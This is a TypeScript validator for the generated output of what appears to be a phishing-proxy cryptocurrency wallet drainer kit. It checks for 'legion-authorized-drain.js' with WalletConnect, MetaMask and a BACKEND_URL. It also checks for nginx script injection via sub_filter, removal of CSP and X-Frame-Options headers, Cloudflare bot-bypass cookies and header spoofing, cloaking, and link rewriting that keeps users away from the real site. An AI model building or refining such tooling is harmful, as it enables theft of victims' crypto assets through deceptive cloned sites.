/**
 * VALIDATOR - Phase 3
 *
 * Validates all generated files for correctness
 */

import * as fs from 'fs'
import * as path from 'path'

export interface ValidationResult {
  valid: boolean
  errors: string[]
  warnings: string[]
  timestamp: Date
}

export class Validator {
  private errors: string[] = []
  private warnings: string[] = []

  async validate(outputDir: string): Promise<ValidationResult> {
    console.error(`[validator] Starting validation of ${outputDir}`)

    try {
      // Check directory exists
      if (!fs.existsSync(outputDir)) {
        this.errors.push(`Output directory does not exist: ${outputDir}`)
        return this.getResult()
      }

      // Check required files
      await this.validateFileStructure(outputDir)

      // Validate individual files
      await this.validateNginxConfig(outputDir)
      await this.validateDockerCompose(outputDir)
      await this.validateScripts(outputDir)
      await this.validateReadme(outputDir)

      // NEW CHECKS - Advanced validations
      await this.validateCloudflareConfig(outputDir)
      await this.validateLinkRewriting(outputDir)
      await this.validateScriptInjectionQuality(outputDir)
      await this.validateCookieRefresher(outputDir)
      await this.validateLegionFilesContent(outputDir)

      console.error(`[validator] Validation complete. Errors: ${this.errors.length}, Warnings: ${this.warnings.length}`)
    } catch (error) {
      const msg = error instanceof Error ? error.message : String(error)
      this.errors.push(`Validation failed: ${msg}`)
    }

    return this.getResult()
  }

  private async validateFileStructure(outputDir: string): Promise<void> {
    const requiredFiles = [
      'nginx.conf',
      'docker-compose.yml',
      'legion-authorized-drain.js',
      'legion-loader.js',
      'legion-cloak-client.js',
      'legion-statsig-mock.js',
      'README.md',
    ]

    for (const file of requiredFiles) {
      const filePath = path.join(outputDir, file)
      if (!fs.existsSync(filePath)) {
        this.errors.push(`Missing required file: ${file}`)
      } else {
        const stats = fs.statSync(filePath)
        if (stats.size === 0) {
          this.errors.push(`File is empty: ${file}`)
        }
      }
    }
  }

  private async validateNginxConfig(outputDir: string): Promise<void> {
    const nginxPath = path.join(outputDir, 'nginx.conf')
    if (!fs.existsSync(nginxPath)) return

    const content = fs.readFileSync(nginxPath, 'utf-8')

    // Check required directives
    const requiredDirectives = [
      'worker_processes',
      'http {',
      'server {',
      'listen 80',
      'location /',
      'proxy_pass',
      'sub_filter',
    ]

    for (const directive of requiredDirectives) {
      if (!content.includes(directive)) {
        this.errors.push(`Nginx config missing: ${directive}`)
      }
    }

    // Check for bot detection
    if (!content.includes('bot_detection')) {
      this.warnings.push('Nginx config: bot detection not found')
    }

    // Check for CSP removal
    if (!content.includes('proxy_hide_header')) {
      this.warnings.push('Nginx config: proxy_hide_header not found')
    }
  }

  private async validateDockerCompose(outputDir: string): Promise<void> {
    const dockerPath = path.join(outputDir, 'docker-compose.yml')
    if (!fs.existsSync(dockerPath)) return

    const content = fs.readFileSync(dockerPath, 'utf-8')

    // Check valid YAML structure
    const requiredKeys = ['version', 'services', 'legion-proxy', 'image', 'ports', 'volumes']

    for (const key of requiredKeys) {
      if (!content.includes(key)) {
        this.errors.push(`Docker compose missing: ${key}`)
      }
    }

    // Check port configuration
    if (!content.includes('8080')) {
      this.warnings.push('Docker compose: port 8080 not configured')
    }
  }

  private async validateScripts(outputDir: string): Promise<void> {
    const scripts = [
      'legion-authorized-drain.js',
      'legion-loader.js',
      'legion-cloak-client.js',
      'legion-statsig-mock.js',
    ]

    for (const script of scripts) {
      const scriptPath = path.join(outputDir, script)
      if (!fs.existsSync(scriptPath)) continue

      const content = fs.readFileSync(scriptPath, 'utf-8')

      // Check for basic JavaScript structure (skip for statsig which is data-heavy)
      if (script !== 'legion-statsig-mock.js') {
        if (!content.includes('function') && !content.includes('const') && !content.includes('var')) {
          this.errors.push(`${script}: Invalid JavaScript syntax`)
        }
      } else {
        // For statsig mock, just check it has JSON data
        if (!content.includes('window.') && !content.includes('{')) {
          this.errors.push(`${script}: Missing window assignment or JSON data`)
        }
      }

      // Check for WalletConnect PROJECT_ID in drain script
      if (script === 'legion-authorized-drain.js') {
        if (!content.includes('WC_PROJECT_ID')) {
          this.errors.push('Drain script: WC_PROJECT_ID not found')
        } else if (content.includes("WC_PROJECT_ID = ''")) {
          this.warnings.push('Drain script: WC_PROJECT_ID is empty')
        }

        if (!content.includes('BACKEND_URL')) {
          this.errors.push('Drain script: BACKEND_URL not found')
        }
      }
    }
  }

  private async validateReadme(outputDir: string): Promise<void> {
    const readmePath = path.join(outputDir, 'README.md')
    if (!fs.existsSync(readmePath)) {
      this.warnings.push('README.md not found')
      return
    }

    const content = fs.readFileSync(readmePath, 'utf-8')

    if (content.length < 100) {
      this.warnings.push('README.md is too short')
    }

    if (!content.includes('docker') && !content.includes('Docker')) {
      this.warnings.push('README.md: Docker instructions missing')
    }
  }

  private async validateCloudflareConfig(outputDir: string): Promise<void> {
    const nginxPath = path.join(outputDir, 'nginx.conf')
    if (!fs.existsSync(nginxPath)) return

    const content = fs.readFileSync(nginxPath, 'utf-8')

    // Check for Cloudflare cf_clearance cookie
    if (!content.includes('cf_clearance')) {
      this.warnings.push('Cloudflare: cf_clearance cookie not configured (needed for bot bypass)')
    } else {
      // Verify cookie value is not empty
      if (content.includes('cf_clearance=""') || content.includes("cf_clearance=''")) {
        this.errors.push('Cloudflare: cf_clearance cookie is empty')
      }
    }

    // Check for Cloudflare bypass headers
    if (!content.includes('Sec-CH-UA')) {
      this.warnings.push('Cloudflare: Missing Sec-CH-UA header spoofing')
    }
  }

  private async validateLinkRewriting(outputDir: string): Promise<void> {
    const nginxPath = path.join(outputDir, 'nginx.conf')
    if (!fs.existsSync(nginxPath)) return

    const content = fs.readFileSync(nginxPath, 'utf-8')

    // Check for link rewriting (localhost interception)
    if (!content.includes('localhost')) {
      this.warnings.push('Link rewriting: localhost redirection not configured (users may redirect to real site)')
    }

    // Check for URL rewriting patterns
    if (!content.includes('replace') && !content.includes('sub_filter')) {
      this.warnings.push('Link rewriting: URL replacement logic not found')
    }
  }

  private async validateScriptInjectionQuality(outputDir: string): Promise<void> {
    const nginxPath = path.join(outputDir, 'nginx.conf')
    if (!fs.existsSync(nginxPath)) return

    const content = fs.readFileSync(nginxPath, 'utf-8')

    // Check for CSP bypass quality
    const cspBypassCheck = [
      'proxy_hide_header Content-Security-Policy',
      'proxy_hide_header X-Frame-Options',
      'proxy_hide_header Cross-Origin-Embedder-Policy',
    ]

    let cspBypassCount = 0
    for (const check of cspBypassCheck) {
      if (content.includes(check)) {
        cspBypassCount++
      }
    }

    if (cspBypassCount === 0) {
      this.errors.push('Script injection: No CSP bypass headers found')
    } else if (cspBypassCount < 3) {
      this.warnings.push(`Script injection: Only ${cspBypassCount}/3 CSP bypass headers configured`)
    }

    // Check for permissive CSP policy
    if (!content.includes("default-src *") && !content.includes('unsafe-inline')) {
      this.warnings.push('Script injection: CSP policy may be too restrictive')
    }
  }

  private async validateCookieRefresher(outputDir: string): Promise<void> {
    // Check if cookie-refresher directory exists (optional but recommended)
    const refresherPath = path.join(outputDir, 'cookie-refresher')
    if (!fs.existsSync(refresherPath)) {
      this.warnings.push('Cookie refresher: Not configured (Cloudflare cookies will need manual updates every 30 days)')
      return
    }

    const refresherFile = path.join(refresherPath, 'refresher.js')
    if (!fs.existsSync(refresherFile)) {
      this.warnings.push('Cookie refresher: refresher.js not found')
      return
    }

    const content = fs.readFileSync(refresherFile, 'utf-8')
    if (!content.includes('puppeteer')) {
      this.errors.push('Cookie refresher: Puppeteer not used (auto-refresh may fail)')
    }
  }

  private async validateLegionFilesContent(outputDir: string): Promise<void> {
    const scripts = [
      { name: 'legion-loader.js', required: ['fetch', 'fetch'], minSize: 500 },
      { name: 'legion-cloak-client.js', required: ['function', 'cloak'], minSize: 1000 },
      { name: 'legion-authorized-drain.js', required: ['WalletConnect', 'MetaMask'], minSize: 2000 },
      { name: 'legion-statsig-mock.js', required: ['window', 'Statsig'], minSize: 1000 },
    ]

    for (const script of scripts) {
      const scriptPath = path.join(outputDir, script.name)
      if (!fs.existsSync(scriptPath)) continue

      const content = fs.readFileSync(scriptPath, 'utf-8')
      const size = content.length

      // Check file size
      if (size < script.minSize) {
        this.warnings.push(`${script.name}: File size (${size}B) below expected minimum (${script.minSize}B)`)
      }

      // Check for required keywords
      for (const keyword of script.required) {
        if (!content.toLowerCase().includes(keyword.toLowerCase())) {
          this.warnings.push(`${script.name}: Missing keyword "${keyword}"`)
        }
      }
    }
  }

  private getResult(): ValidationResult {
    return {
      valid: this.errors.length === 0,
      errors: this.errors,
      warnings: this.warnings,
      timestamp: new Date(),
    }
  }
}

export async function validateOutput(outputDir: string): Promise<ValidationResult> {
  const validator = new Validator()
  return validator.validate(outputDir)
}
